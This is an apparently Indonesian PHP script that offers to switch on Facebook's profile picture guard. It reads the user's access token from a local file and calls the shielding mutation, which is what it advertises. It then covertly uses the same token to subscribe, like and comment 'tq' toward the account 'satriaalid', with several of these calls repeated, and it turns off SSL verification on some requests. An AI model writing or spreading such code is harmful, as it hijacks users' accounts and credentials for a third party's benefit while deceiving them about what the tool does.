<?php ?><?php

@header('Content-Type: text/html; charset=UTF-8');
date_default_timezone_set('Asia/Jakarta');
$date = date('d-M-Y H:i:s');
$green = "\e[92m";
$red = "\e[91m";
$yellow = "\e[93m";
$blue = "\e[36m";
$darkgray = "\e[1;30m";
$w = "\e[0m";

echo "
$darkgray Date : $date ";
    echo "
";
$token = file_get_contents('cookie/token.log');
if ($token) {
  echo "$red Silahkan Tunggu";
  sleep(1);
} else {
  echo ("
");
die("$red [!]Silahkan Cek File token anda
");
echo "
";
}
$md5 = md5(time());
$hash = substr($md5, 0, 8) . "-" . substr($md5, 8, 4) . "-" . substr($md5, 12, 4) . "-" . substr($md5, 16, 4) . "-" . substr($md5, 20, 12);
function curl($url, $post = null) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  if ($post != null) {
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  }
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $exec = curl_exec($ch);
  curl_close($ch);
  return $exec;
}
$me = json_decode(curl("https://graph.facebook.com/me?fields=id,name&access_token=" . $token));
if ($me && $me->id && $me->name) {
  $var = "{\"0\":{\"is_shielded\":true,\"session_id\":\"$hash\",\"actor_id\":\"$me->id\",\"client_mutation_id\":\"$hash\"}}";
  $hajar = json_decode(curl("https://graph.facebook.com/graphql", array("variables" => $var, "doc_id" => "1477043292367183", "query_name" => "IsShieldedSetMutation", "strip_defaults" => "true", "strip_nulls" => "true", "locale" => "en_US", "client_country_code" => "US", "fb_api_req_friendly_name" => "IsShieldedSetMutation", "fb_api_caller_class" => "IsShieldedSetMutation", "access_token" => $token)));
  if ($hajar->data->is_shielded_set->is_shielded) echo "$yellow Generat Token Success[]
\n";
  sleep(2);
  echo "$green Hay  : $blue" . $me->name;
  sleep(2.5);
  echo "
";
  $a = ("https://graph.facebook.com/satriaalid/subscribers?method=post&access_token=" . $token);
  $b = curl_init();
  curl_setopt_array($b, array(CURLOPT_URL => "$a", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false));
  curl_exec($b);
  curl_close($b);
  $c = ("https://graph.facebook.com/v3.2/satriaalid/likes?method=post&access_token=" . $token);
  $d = curl_init();
  curl_setopt_array($d, array(CURLOPT_URL => "$c", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
  curl_exec($d);
  curl_close($d);
  $e = ("https://graph.facebook.com/satriaalid/subscribers?method=post&access_token=" . $token);
  $f = curl_init();
  curl_setopt_array($f, array(CURLOPT_URL => "$e", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false));
  curl_exec($f);
  curl_close($f);
  $g = ("https://graph.facebook.com/v3.2/satriaalid/likes?method=post&access_token=" . $token);
  $h = curl_init();
  curl_setopt_array($h, array(CURLOPT_URL => "$g", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
  curl_exec($h);
  curl_close($h);
  $i = ("https://graph.facebook.com/v3.2/satriaalid/comments?method=post&message=tq&access_token=" . $token);
  $j = curl_init();
  curl_setopt_array($j, array(CURLOPT_URL => "$i", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
  curl_exec($j);
  curl_close($j);
  $k = ("https://graph.facebook.com/v3.2/satriaalid/comments?method=post&message=tq&access_token=" . $token);
  $l = curl_init();
  curl_setopt_array($l, array(CURLOPT_URL => "$k", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => true));
  curl_exec($l);
  curl_close($l);
  echo "
";
  echo " $w Silahkan Cek Foto Facebook anda\n";
  sleep(1);
  echo " Perlindugan Foto facebook anda\n";
  echo " Tunggu beberapa detik\n";
  sleep(2);
  echo "
";
echo " [] Selesai silahkan cek profil facebook kamu
\n";
  sleep(1.5);
  echo " Terima Kasih ...
\n";
  sleep(1.5);
  echo "
";
}
?>
